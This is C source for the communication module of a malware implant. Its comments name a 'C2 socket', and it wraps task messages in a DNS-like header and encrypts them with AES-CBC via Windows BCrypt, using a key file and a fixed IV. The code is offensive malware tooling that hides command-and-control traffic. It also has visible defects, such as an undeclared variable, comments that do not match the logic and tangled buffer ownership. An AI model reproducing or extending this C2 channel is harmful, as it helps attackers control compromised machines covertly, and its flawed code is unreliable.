#include "protocol.h"

#define SOCKET_SEND_FLAGS 0
#define SOCKET_RECV_FLAGS 0
#define TLV_TYPE_FIELD_OFFSET 0U
#define TLV_LENGTH_FIELD_OFFSET sizeof(DWORD)

/**
 * @brief Sends exactly len bytes on the active socket.
 *
 * This helper loops until the full buffer has been transmitted or a socket
 * error occurs.
 *
 * @param sock The active C2 socket used to send data.
 * @param buf The byte buffer to send.
 * @param len The number of bytes to send.
 *
 * @return TRUE on success, or FALSE if send fails.
 */
static BOOL SendAll(SOCKET sock, CONST CHAR* buf, INT len)
{
	struct sockaddr_in sa = GetSockAddr();

	ASSERT(sock != INVALID_SOCKET);
	ASSERT(buf != NULL);

	INT sent = sendto(
		sock,
		buf,
		len,
		SOCKET_SEND_FLAGS,
		(struct sockaddr*)&sa,
		sizeof(struct sockaddr)
	);
	if (sent == SOCKET_ERROR)
	{
		return FALSE;
	}

	return TRUE;
}

/**
 * @brief Receives exactly len bytes from the active socket.
 *
 * This helper loops until the full buffer has been read or a socket error
 * occurs.
 *
 * @param sock The active C2 socket used to receive data.
 * @param buf The output buffer to fill.
 * @param len The number of bytes to receive.
 *
 * @return TRUE on success, or FALSE if recv fails or the peer disconnects.
 */
static BOOL RecvAll(SOCKET sock, CHAR* buf, INT len)
{

	ASSERT(sock != INVALID_SOCKET);
	ASSERT(buf != NULL);

	INT received = recvfrom(
		sock,
		buf,
		len,
		SOCKET_RECV_FLAGS,
		NULL,
		NULL
	);
	if (received <= 0)
	{
		return FALSE;
	}

	return TRUE;
}

BOOL SendTlvMessage(SOCKET sock, USHORT taskId, DWORD type, DWORD payloadLength, CONST PBYTE payload)
{
	DWORD lenRequired = DNS_HEADER_SIZE + TLV_HEADER_SIZE + payloadLength;
	lenRequired += (16 - (lenRequired % 16)); // pad to block size for encryption
	PBYTE msg = ImplantHeapAlloc(len_required);

	ASSERT(sock != INVALID_SOCKET);

	memcpy(msg + TLV_TYPE_FIELD_OFFSET, &type, sizeof(DWORD));
	memcpy(msg + TLV_LENGTH_FIELD_OFFSET, &payloadLength, sizeof(DWORD));
	memcpy(msg + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD), payload, payloadLength);

	EncodeDNS(&msg, taskId, type, &payloadLength, payload);

	if (!SendAll(sock, (CONST CHAR*)msg, payloadLength))
	{
		ImplantHeapFree(msg);
		return FALSE;
	}

	ImplantHeapFree(msg);
	return TRUE;
}

BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
{
	PBYTE buff = ImplantHeapAlloc(MAX_MESSAGE_SIZE);
	PBYTE out = NULL;
	ASSERT(sock != INVALID_SOCKET);
	ASSERT(msg != NULL);

	msg->type = 0;
	msg->length = 0;
	msg->value = NULL;

	if (!RecvAll(sock, (CHAR*)buff, MAX_MESSAGE_SIZE))
	{
		ImplantHeapFree(buff);
		return FALSE;
	}

	DecodeDNS(buff, &out);

	msg->type = *(DWORD*)(out + TLV_TYPE_FIELD_OFFSET);
	msg->length = *(DWORD*)(out + TLV_LENGTH_FIELD_OFFSET);

	if (msg->length >= MAX_MESSAGE_SIZE)
	{
		ImplantHeapFree(buff);
		return FALSE;
	}

	if (msg->length > 0)
	{
		msg->value = (PBYTE)ImplantHeapAlloc((SIZE_T)msg->length);
		if (msg->value == NULL)
		{
			ImplantHeapFree(buff);
			return FALSE;
		}

		memcpy(msg->value,
			out + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD),
			msg->length
		);
	}

	ImplantHeapFree(buff);

	return TRUE;
}

VOID FreeTlvMessage(TLV_MESSAGE* msg)
{
	ASSERT(msg != NULL);

	if (msg->value != NULL)
	{
		ImplantHeapFree(msg->value);
		msg->value = NULL;
	}
}

BOOL EncodeDNS(PBYTE* msg, USHORT taskId, DWORD type, DWORD* payloadLength, PBYTE payload)
{
	USHORT length, dummyAnswer, dummyAuthority, dummyAdditional;
	dummyAnswer = 0;
	dummyAuthority = 0;
	dummyAdditional = 0;
	length = (USHORT)*payloadLength;
	PBYTE payload_copy = ImplantHeapAlloc(*payloadLength + TLV_HEADER_SIZE);

	//memcpy(dest, src, size);
	memcpy(*msg, &taskId, sizeof(USHORT));
	memcpy(*msg + DNS_FLAGS_OFFSET, (USHORT*)&type, sizeof(USHORT));
	memcpy(*msg + DNS_LENGTH_OFFSET, &length, sizeof(USHORT));
	memcpy(*msg + DNS_ANSWER_OFFSET, &dummyAnswer, sizeof(USHORT));
	memcpy(*msg + DNS_AUTHORITY_OFFSET, &dummyAuthority, sizeof(USHORT));
	memcpy(*msg + DNS_ADDITIONAL_OFFSET, &dummyAdditional, sizeof(USHORT));


	// C
	memcpy(payload_copy, payload, *payloadLength);
	/* Encrypt will take ownership of payload_copy and free it on success */
	Encrypt(&payload_copy, *payloadLength + TLV_HEADER_SIZE);
	/* use payload_copy (encrypted buffer) here */
	memcpy(*msg + DNS_HEADER_SIZE, payload_copy, *payloadLength); // ensure length is correct
	// ImplantHeapFree(payload_copy) not needed if Encrypt frees on success

	*payloadLength = (DWORD)(length + DNS_HEADER_SIZE);

	return TRUE;
}

BOOL DecodeDNS(PBYTE buff, PBYTE* out)
{
	DWORD payloadLength = 0;
	
	//strip DNS header
	payloadLength = *(DWORD*)(buff + DNS_LENGTH_OFFSET);
	*out = buff + DNS_HEADER_SIZE;

	//Decrypt payload of DNS message
	return Decrypt(*out, &payloadLength);
}

//I used Gemini to write the Encrypt and Decrypt() functions
BOOL Encrypt(PBYTE* msg, DWORD msgLength) {
	BCRYPT_ALG_HANDLE hAlg = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;
	NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
	PBYTE buff = ImplantHeapAlloc(KEY_BUFF_SIZE);
	PBYTE temp = *msg;
	ULONG sizeRequired = 0;
	HANDLE keyFile = NULL;
	BOOL ret = TRUE;
	UCHAR ivInitial[IV_SIZE] = IV;
	UCHAR ivBuff[IV_SIZE] = { 0 };
	memcpy(ivBuff, ivInitial, IV_SIZE);

	if (status != STATUS_SUCCESS)
	{
		ImplantHeapFree(buff);
		return FALSE;
	}

	status = BCryptSetProperty(
		hAlg,
		BCRYPT_CHAINING_MODE,
		(PBYTE)BCRYPT_CHAIN_MODE_CBC,
		sizeof(BCRYPT_CHAIN_MODE_CBC),
		0);
	if (status != STATUS_SUCCESS)
	{
		ImplantHeapFree(buff);
		return FALSE;
	}

	keyFile = CreateFileW(L"..\\key.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (keyFile == INVALID_HANDLE_VALUE)
	{
		ret = FALSE;
		goto cleanup;
	}

	if (!ReadFile(keyFile, buff, KEY_BUFF_SIZE, NULL, NULL))
	{
		ret = FALSE;
		goto cleanup;
	}

	status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey, NULL, 0, buff, KEY_BUFF_SIZE, 0);
	if (status != STATUS_SUCCESS)
	{
		ret = FALSE;
		goto cleanup;
	}

	status = BCryptEncrypt(hKey, temp, msgLength, NULL, ivBuff, IV_SIZE, NULL, 0, &sizeRequired, BCRYPT_BLOCK_PADDING);
	*msg = ImplantHeapAlloc(sizeRequired);
	status = BCryptEncrypt(hKey, temp, msgLength, NULL, ivBuff, IV_SIZE, *msg, sizeRequired, &sizeRequired, BCRYPT_BLOCK_PADDING);
	if (status != STATUS_SUCCESS)
	{
		ret = FALSE;
		goto cleanup;
	}

cleanup:
	if (hAlg != NULL)
	{
		BCryptCloseAlgorithmProvider(hAlg, 0);
	}
	if (hKey != NULL)
	{
		BCryptDestroyKey(hKey);
	}
	if (ret == FALSE)
	{
		ImplantHeapFree(buff);
	}
	else
	{
		ImplantHeapFree(temp);
	}
	if (keyFile != NULL)
	{
		CloseHandle(keyFile);
	}

	return ret;
}

BOOL Decrypt(PBYTE msg, DWORD* msgLength) {
	BCRYPT_ALG_HANDLE hAlg = NULL;
	NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
	BCRYPT_KEY_HANDLE hKey = NULL;
	PBYTE buff = ImplantHeapAlloc(KEY_BUFF_SIZE);
	ULONG sizeRequired = 0;
	HANDLE keyFile = NULL;
	BOOL ret = TRUE;
	UCHAR ivInitial[IV_SIZE] = IV;
	UCHAR ivBuff[IV_SIZE] = { 0 };
	memcpy(ivBuff, ivInitial, IV_SIZE);

	if (status != STATUS_SUCCESS)
	{
		ret = FALSE;
		goto cleanup;
	}

	keyFile = CreateFileW(L"..\\key.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (keyFile == INVALID_HANDLE_VALUE)
	{
		ret = FALSE;
		goto cleanup;
	}

	if (!ReadFile(keyFile, buff, KEY_BUFF_SIZE, NULL, NULL))
	{
		ret = FALSE;
		goto cleanup;
	}

	status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey, NULL, 0, buff, KEY_BUFF_SIZE, 0);
	if (status != STATUS_SUCCESS)
	{
		ret = FALSE;
		goto cleanup;
	}

	status = BCryptDecrypt(hKey, msg, *msgLength, NULL, ivBuff, IV_SIZE, NULL, 0, &sizeRequired, 0);
	if (status != STATUS_SUCCESS)
	{
		ret = FALSE;
		goto cleanup;
	}

	if (sizeRequired <= *msgLength)
	{

		status = BCryptDecrypt(hKey, msg, *msgLength, NULL, ivBuff, IV_SIZE, msg, sizeRequired, &sizeRequired, 0);
		if (status != STATUS_SUCCESS)
		{
			ret = FALSE;
			goto cleanup;
		}
		*msgLength = sizeRequired;
	}

cleanup:
	if (hAlg != NULL)
	{
		BCryptCloseAlgorithmProvider(hAlg, 0);
	}
	if (hKey != NULL)
	{
		BCryptDestroyKey(hKey);
	}
	if (buff != NULL)
	{
		ImplantHeapFree(buff);
	}
	if (keyFile != NULL)
	{
		CloseHandle(keyFile);
	}
	
	return ret;
}